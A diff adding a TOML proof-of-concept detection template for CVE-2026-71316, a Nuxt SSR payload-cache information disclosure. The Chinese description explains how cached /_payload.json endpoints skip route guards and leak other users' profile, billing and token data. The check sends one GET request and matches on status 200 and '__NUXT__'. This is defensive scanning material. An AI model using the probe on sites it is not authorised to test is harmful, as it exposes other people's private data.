@@ -1,0 +1,30 @@
+[info]
+author = "ave"
+description = "检测目标站点是否存在 Nuxt SSR 数据泄露漏洞。当页面配置了 routeRules 的 cache、swr 或 isr 时，Nuxt 启用运行时负载提取并暴露 /<page>/_payload.json 端点。受影响版本在返回缓存数据时不强制执行路由中间件和页面守卫，导致未认证用户或其他已认证用户获取其他用户的 SSR 数据（包括通过 useFetch/useAsyncData 加载的个人资料、租户、账单及 token 类值）。"
+id = "POC-AVE-2026-1422"
+name = "CVE-2026-71316 Nuxt Payload Cache Information Disclosure PoC"
+severity = "high"
+tags = ["ave-2026-1422"]
+vuln_id = [
+    "CVE-2026-71316",
+    "AVE-2026-1422",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/_payload.json"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["__NUXT__"]
